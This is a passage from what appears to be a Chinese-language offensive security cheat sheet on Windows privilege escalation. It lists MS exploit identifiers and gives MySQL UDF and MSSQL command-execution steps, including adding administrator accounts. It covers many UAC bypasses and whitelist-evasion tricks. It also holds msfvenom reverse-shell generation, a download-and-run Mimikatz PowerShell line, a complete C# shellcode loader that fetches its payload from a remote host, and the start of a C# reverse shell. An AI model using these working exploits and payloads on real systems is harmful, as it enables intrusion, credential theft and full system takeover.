R2/2008 R2) MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) MS14-070 [KB2989935] [Kernel Driver] (2003) MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) MS14-002 [KB2914368] [NDProxy] (2003/XP) MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) MS12-042 [KB2972621] [Service Bus] (2008/2012/win7) MS12-020 [KB2671387] [RDP] (2003/2008/7/XP) MS11-080 [KB2592799] [AFD.sys] (2003/XP) MS11-062 [KB2566454] [NDISTAPI] (2003/XP) MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) MS10-092 [KB2305420] [Task Scheduler] (2008/7) MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2) MS09-050 [KB975517] [Remote Code Execution] (2008/Vista) MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) MS08-068 [KB957097] [Remote Code Execution] (2000/XP) MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) MS08-066 [] [] (Windows 2000/XP/Server 2003) MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)</code></pre><h3 id="激活guest"><a href="#激活guest" class="headerlink" title="激活guest"></a>激活guest</h3><pre><code>&gt;net user guest /active:yes</code></pre><h3 id="MYSQL-udf"><a href="#MYSQL-udf" class="headerlink" title="MYSQL udf"></a>MYSQL udf</h3><pre><code>Udf: sqlmap-master\udf\mysql\windows\&gt;python sqlmap/extra/cloak/cloak.py lib_mysqludf_sys.dll _ Mysql&gt;5.1 udf.dll放置在lib\plugin Mysql&lt;5.1 udf.dll放置在c:\windows\system32#show variables like &#39;%compile%&#39;; 查看系统版本#select @@plugin_dir 查看插件目录放入udf#select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;; 或将udf十六进制编码后写入#select hex(load_file(&#39;udf_sys_64.dll&#39;)) into dumpfile &#39;/tmp/udf.hex&#39;; #select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000… into dump file &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;或将udf base64编码后写入(MySQL 5.6.1和MariaDB 10.0.5)#select to_base64(load_file(&#39;/usr/udf.dll&#39;)) into dumpfile &#39;/tmp/udf.b64&#39;;#select from_base64(“xxxxx”) into dumpfile &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;或创建表拼接十六进制编码#create table temp(data longblob); #insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); #update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); #select data from temp into dump file &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;或#insert into temp(data) values(hex(load_file(&#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&#39;)));#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE &#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll &#39;;或使用快速导入数据#load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39;#into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data); #select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&#39;;创建函数#create function cmdshell returns string soname &#39;udf.dll&#39;;#create function sys_exec returns int soname &#39;udf.dll&#39;;执行命令#select cmdshell(&#39;whoami&#39;); #select sys_exec(&#39;&#39;whoami&#39;&#39;); 删除函数#drop function cmdshell;#drop function sys_exec;</code></pre><h3 id="MYSQL-Linux-Root"><a href="#MYSQL-Linux-Root" class="headerlink" title="MYSQL Linux Root"></a>MYSQL Linux Root</h3><pre><code>https://0xdeadbeef.info/exploits/raptor_udf2.c$ gcc -g -c raptor_udf2.c$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc$ mysql -u root -pmysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file(&#39;/home/raptor/raptor_udf2.so&#39;));mysql&gt; select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;;mysql&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;mysql&gt; select * from mysql.func;</code></pre><table><thead><tr><th>name</th><th>ret</th><th>dl</th><th>type</th></tr></thead><tbody><tr><td>do_system</td><td>2</td><td>raptor_udf2.so</td><td>function</td></tr></tbody></table><pre><code>mysql&gt; select do_system(&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;);mysql&gt; \! shsh-2.05b$ cat /tmp/outuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</code></pre><h3 id="MSSQL-4"><a href="#MSSQL-4" class="headerlink" title="MSSQL"></a>MSSQL</h3><pre><code>开启xp_cmdshell</code></pre><h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><pre><code>#exec sp_configure &#39;show advanced options&#39;, 1;reconfigure; #exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;#exec master.dbo.xp_cmdshell &#39;ipconfig&#39;</code></pre><h4 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h4><pre><code>xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;debugger&#39;,&#39;reg_sz&#39;,&#39;c:\windows\system32\taskmgr.exe&#39;</code></pre><h4 id="xp-dirtree"><a href="#xp-dirtree" class="headerlink" title="xp_dirtree"></a>xp_dirtree</h4><pre><code>execute master..xp_dirtree &#39;c:&#39; //列出所有c:\文件和目录,子目录 execute master..xp_dirtree &#39;c:&#39;,1 //只列c:\文件夹 execute master..xp_dirtree &#39;c:&#39;,1,1 //列c:\文件夹加文件 </code></pre><h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;执行命令declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user 123 123 /add&#39;declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators 123/add&#39;删除文件declare @result intdeclare @fso_token intexec sp_oacreate &#39;scripting.filesystemobject&#39;, @fso_token outexec sp_oamethod @fso_token,&#39;deletefile&#39;,null,&#39;c:\1.txt&#39;exec sp_oadestroy @fso_token复制文件declare @o intexec sp_oacreate &#39;scripting.filesystemobject&#39;,@o outexec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;移动文件declare @o intexec sp_oacreate &#39;scripting.filesystemobject&#39;,@o outexec sp_oamethod @o,&#39;movefile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;</code></pre><h4 id="沙盒执行"><a href="#沙盒执行" class="headerlink" title="沙盒执行"></a>沙盒执行</h4><pre><code>开启沙盒：&gt;exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1执行：&gt;select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</code></pre><h4 id="WarSQLKit-后门"><a href="#WarSQLKit-后门" class="headerlink" title="WarSQLKit(后门)"></a>WarSQLKit(后门)</h4><pre><code>http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit</code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><pre><code>发现补丁#use post/windows/gather/enum_patches列举可用EXP#use post/multi/recon/local_exploit_suggester</code></pre><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><h4 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h4><pre><code>&gt;use exploit/windows/local/bypassuac &gt;use exploit/windows/local/bypassuac_injection&gt;use exploit/windows/local/bypassuac_vbs&gt;use exploit/windows/local/bypassuac_fodhelper&gt;use exploit/windows/local/bypassuac_eventvwr&gt;use exploit/windows/local/bypassuac_comhijack</code></pre><h4 id="DccwBypassUAC"><a href="#DccwBypassUAC" class="headerlink" title="DccwBypassUAC"></a>DccwBypassUAC</h4><pre><code>Use on win10&amp;win8</code></pre><p><img src="./img/105.png" alt="image"></p><h4 id="K8uac"><a href="#K8uac" class="headerlink" title="K8uac"></a>K8uac</h4><pre><code>&gt;k8uac.exe xx.exe&gt;k8uac.exe &quot;command&quot;</code></pre><h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><pre><code>设置UAC和Applocker规则</code></pre><p><img src="./img/106.png" alt="image"><br><img src="./img/107.png" alt="image"><br><img src="./img/108.png" alt="image"><br><img src="./img/109.png" alt="image"></p><pre><code>MSF生成恶意DLL传入靶机&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll</code></pre><p><img src="./img/110.png" alt="image"></p><pre><code>DLL同目录下建立run.inf，RegisterOCXSection指定dll位置，也可以指定远程webdav如：\\192.168.0.107\webdav\cm.dll[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall_SingleUser]RegisterOCXs=RegisterOCXSection[RegisterOCXSection]C:\Users\y.SUB2K8\Desktop\cm.dll[Strings]AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;ServiceName=&quot;cmstp&quot;ShortSvcName=&quot;cmstp&quot;执行命令可绕过UAC和Applocker上线&gt;cmstp /s run.inf</code></pre><p><img src="./img/111.png" alt="image"></p><h4 id="Uacme"><a href="#Uacme" class="headerlink" title="Uacme"></a>Uacme</h4><pre><code>包括DLL劫持，COM劫持等50多种bypass方法https://github.com/hfiref0x/UACME</code></pre><p><img src="./img/112.png" alt="image"></p><pre><code>使用visual studio编译Visual Studio 2013v120；Visual Studio 2015v140；Visual Studio 2017v141;Visual Studio 2019v142。目前共59种bypassuac方式执行方法是&gt;akagi.exe 1&gt;akagi.exe 1 c:\windows\system32\cmd.exe&gt;akagi.exe 1 &quot;net user 1 1 /add&quot;注意：方式5，9会对目标安全性产生影响，谨慎使用，5需重启方式6从win8开始在x64上不可用方式11，54只支持x32 方式13，19，30，50只支持x64方式14需要进程注入，x64要使用x64的工具</code></pre><h4 id="Bypass-UAC-1"><a href="#Bypass-UAC-1" class="headerlink" title="Bypass-UAC"></a>Bypass-UAC</h4><pre><code>https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC&gt;Bypass-UAC -Method UacMethodSysprep</code></pre><p><img src="./img/113.png" alt="image"></p><pre><code>Method:UacMethodSysprepucmDismMethodUacMethodMMC2UacMethodTcmsetupUacMethodNetOle32</code></pre><h4 id="DLL-hijack"><a href="#DLL-hijack" class="headerlink" title="DLL hijack"></a>DLL hijack</h4><pre><code>程序运行，调用DLL的流程1.程序所在目录2.系统目录即 SYSTEM32 目录3.16位系统目录即 SYSTEM 目录4.Windows目录5.加载 DLL 时所在的当前目录6.PATH环境变量中列出的目录使用https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck检查一个程序的是否以高权限执行&gt;sigcheck.exe -m c:\1.exe查看autoElevate是否为true</code></pre><p><img src="./img/114.png" alt="image"></p><pre><code>使用process monitor查看对应程序执行时调用的DLL情况，查找DLL不在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs列表中，并且所在文件夹当前用户可读写，接下来生成恶意dll备份原DLL替换，再运行此程序即可劫持成功。</code></pre><h4 id="SilentCleanup"><a href="#SilentCleanup" class="headerlink" title="SilentCleanup"></a>SilentCleanup</h4><pre><code>&gt;reg add hkcu\Environment /v windir /d &quot;cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM &quot;&gt;schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code></pre><h4 id="Sdclt"><a href="#Sdclt" class="headerlink" title="Sdclt"></a>Sdclt</h4><pre><code>win10</code></pre><h5 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h5><pre><code>&gt;reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot; /t REG_SZ /d %COMSPEC% /f 获得管理员权限&gt;sdclt 弹出cmd&gt;reg delete &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot; /f 清除痕迹</code></pre><h5 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h5><pre><code>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1&gt;Invoke-SDCLTBypass -Command &quot;c:\windows\system32\cmd.exe /c C:\Windows\regedit.exe&quot;&gt;sdclt.exe /KickOffElev</code></pre><h4 id="Makecab-amp-Wusa"><a href="#Makecab-amp-Wusa" class="headerlink" title="Makecab&amp;Wusa"></a>Makecab&amp;Wusa</h4><pre><code>复制文件出错时</code></pre><p><img src="./img/115.png" alt="image"></p><pre><code>&gt;makecab PsExec64.exe C:\Users\y.ZONE\Desktop\ps.cab&gt;wusa C:\Users\y.ZONE\Desktop\ps.cab /extract:C:\Windows\system32\</code></pre><p><img src="./img/116.png" alt="image"></p><h4 id="CLR-BypassUAC"><a href="#CLR-BypassUAC" class="headerlink" title="CLR BypassUAC"></a>CLR BypassUAC</h4><pre><code>Tested on win10 x64生成dll传入受控机temp目录，以下保存为1.bat执行。REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /fREG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /fREG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /fREG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f受控机执行gpedit.msc或eventvwr等高权限.net程序时可劫持成功。</code></pre><p><img src="./img/117.png" alt="image"></p><pre><code>执行后</code></pre><p><img src="./img/118.png" alt="image"><br><img src="./img/119.png" alt="image"><br><img src="./img/120.png" alt="image"></p><h4 id="eventvwr劫持注册表"><a href="#eventvwr劫持注册表" class="headerlink" title="eventvwr劫持注册表"></a>eventvwr劫持注册表</h4><pre><code>打开ProcessMonitor，启动eventvwr，ctrl+T打开进程树，选择进程转到事件</code></pre><p><img src="./img/121.png" alt="image"></p><pre><code>右键选择包括eventvwr.exe</code></pre><p><img src="./img/122.png" alt="image"></p><pre><code>只选择显示注册表活动</code></pre><p><img src="./img/123.png" alt="image"></p><pre><code>添加一条过滤器，显示not found文件</code></pre><p><img src="./img/124.png" alt="image"></p><pre><code>找到相应的注册表位置</code></pre><p><img src="./img/125.png" alt="image"><br><img src="./img/126.png" alt="image"></p><pre><code>值修改为</code></pre><p><img src="./img/127.png" alt="image"></p><pre><code>MSF监听，再次打开eventvwr</code></pre><p><img src="./img/128.png" alt="image"></p><h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a>Web Delivery</h4><pre><code>&gt;use exploit/multi/script/web_delivery&gt;set target 3&gt;set payload windows/x64/meterpreter/reverse_tcp&gt;exploit&gt;use auxiliary/server/regsvr32_command_delivery_server&gt;set cmd ipconfig&gt;use exploit/windows/misc/regsvr32_applocker_bypass_server</code></pre><h4 id="Invoke-PsUACme"><a href="#Invoke-PsUACme" class="headerlink" title="Invoke-PsUACme"></a>Invoke-PsUACme</h4><pre><code>method=&quot;sysprep&quot;,&quot;oobe&quot;,&quot;ActionQueue&quot;,&quot;migwiz&quot;,&quot;cliconfg&quot;,&quot;winsat&quot;,&quot;mmc&quot;&gt;Invoke-PsUACme -method oobe -Payload &quot;c:\user\a\desktop\x.exe&quot;需指定绝对路径&gt;Invoke-PsUACme -method oobe -Payload &quot;powershell -w hidden -e xxxxxx&quot;&gt;Invoke-PsUACme -Payload &quot;powershell -noexit IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot;MSFVENOM生成psh-reflection格式脚本&gt;Invoke-PsUACme –Payload &quot;powershell c:\1.ps1&quot;</code></pre><h3 id="Whitelist-白名单"><a href="#Whitelist-白名单" class="headerlink" title="Whitelist(白名单)"></a>Whitelist(白名单)</h3><h4 id="GreatSCT-1"><a href="#GreatSCT-1" class="headerlink" title="GreatSCT"></a>GreatSCT</h4><pre><code>&gt;git clone https://github.com/GreatSCT/GreatSCT.git&gt;cd GreatSCT/setup&amp;./setup.sh&gt;use Bypass&gt;list&gt;use regasm/meterpreter/rev_tcp.py&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</code></pre><h4 id="JSRat"><a href="#JSRat" class="headerlink" title="JSRat"></a>JSRat</h4><pre><code>&gt;JSRat.py -i 192.168.1.107 -p 4444</code></pre><h4 id="Odbcconf-exe"><a href="#Odbcconf-exe" class="headerlink" title="Odbcconf.exe"></a>Odbcconf.exe</h4><pre><code>&gt;odbcconf.exe /a &#123;regsvr C:\shell.dll&#125; 可以是任意后缀</code></pre><h4 id="Msiexec-exe"><a href="#Msiexec-exe" class="headerlink" title="Msiexec.exe"></a>Msiexec.exe</h4><pre><code>&gt;msiexec /y c:\user\admin\desktop\1.dll&gt;msiexec /q /i http://192.168.0.107/dll.dll</code></pre><h4 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:y.exe  /unsafe C:\Users\y\Desktop\1.csusing System;using System.Net;using System.Linq;using System.Net.Sockets;using System.Runtime.InteropServices;using System.Threading;using System.Configuration.Install;using System.Windows.Forms;public class GQLBigHgUniLuVx &#123;    public static void Main()    &#123;        while(true)        &#123;&#123; MessageBox.Show("doge"); Console.ReadLine();&#125;&#125;    &#125;&#125;[System.ComponentModel.RunInstaller(true)]public class esxWUYUTWShqW : System.Configuration.Install.Installer&#123;    public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)    &#123;        jkmhGrfzsKQeCG.LCIUtRN();    &#125;&#125;public class jkmhGrfzsKQeCG&#123; [DllImport(&quot;kernel&quot;)] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);[DllImport(&quot;kernel32&quot;)] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) &#123;IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);try &#123; XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); &#125;catch &#123; return null;&#125;byte[] UmquAHRnhhpuE = new byte[4];XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);byte[] qaYyFq = new byte[kFVRSNnpj +5];int SRCDELibA =0;while(SRCDELibA &lt; kFVRSNnpj)&#123; SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)&lt;4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);&#125;byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;return qaYyFq;&#125;static void cmMtjerv(byte[] HEHUjJhkrNS) &#123;if(HEHUjJhkrNS !=null) &#123;UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);IntPtr UhxtIFnlOQatrk = IntPtr.Zero;UInt32 wdjYKFDCCf =0;IntPtr XVYcQxpp = IntPtr.Zero;UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); &#125;&#125;public static void LCIUtRN() &#123;byte[] IBtCWU =null; IBtCWU = ErlgHH(&quot;192.168.0.107&quot;,12138);cmMtjerv(IBtCWU);&#125; &#125;生成exe后执行&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\y.exeMSF监听12138端口</code></pre><h4 id="Compiler-exe"><a href="#Compiler-exe" class="headerlink" title="Compiler.exe"></a>Compiler.exe</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.tcp</code></pre><p><img src="./img/129.png" alt="image"></p><h5 id="1-xml"><a href="#1-xml" class="headerlink" title="1.xml"></a>1.xml</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;CompilerInput xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler&quot;&gt;&lt;files xmlns:d2p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;&lt;d2p1:string&gt;1.tcp&lt;/d2p1:string&gt;&lt;/files&gt;&lt;parameters xmlns:d2p1=&quot;http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler&quot;&gt;&lt;assemblyNames xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;compilerOptions i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;coreAssemblyFileName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/coreAssemblyFileName&gt;&lt;embeddedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;evidence xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Security.Policy&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;generateExecutable xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/generateExecutable&gt;&lt;generateInMemory xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;true&lt;/generateInMemory&gt;&lt;includeDebugInformation xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/includeDebugInformation&gt;&lt;linkedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;mainClass i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;outputName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/outputName&gt;&lt;tempFiles i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;treatWarningsAsErrors xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/treatWarningsAsErrors&gt;&lt;warningLevel xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;-1&lt;/warningLevel&gt;&lt;win32Resource i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;&lt;d2p1:compilerOptions i:nil=&quot;true&quot; /&gt;&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;&lt;d2p1:libraryPaths xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; i:nil=&quot;true&quot; /&gt;&lt;d2p1:localAssembly xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Reflection&quot; i:nil=&quot;true&quot; /&gt;&lt;d2p1:mtInfo i:nil=&quot;true&quot;/&gt;&lt;d2p1:userCodeCCUs xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom&quot; i:nil=&quot;true&quot; /&gt;&lt;/parameters&gt;&lt;/CompilerInput&gt;</code></pre><h5 id="1-tcp"><a href="#1-tcp" class="headerlink" title="1.tcp"></a>1.tcp</h5><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>ComponentModel</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Activities</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">SequentialWorkflowActivity</span></span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token class-name">StreamWriter</span> streamWriter<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">TcpClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">TcpClient</span><span class="token punctuation">(</span><span class="token string">"192.168.0.107"</span><span class="token punctuation">,</span> <span class="token number">12138</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">Stream</span> stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token 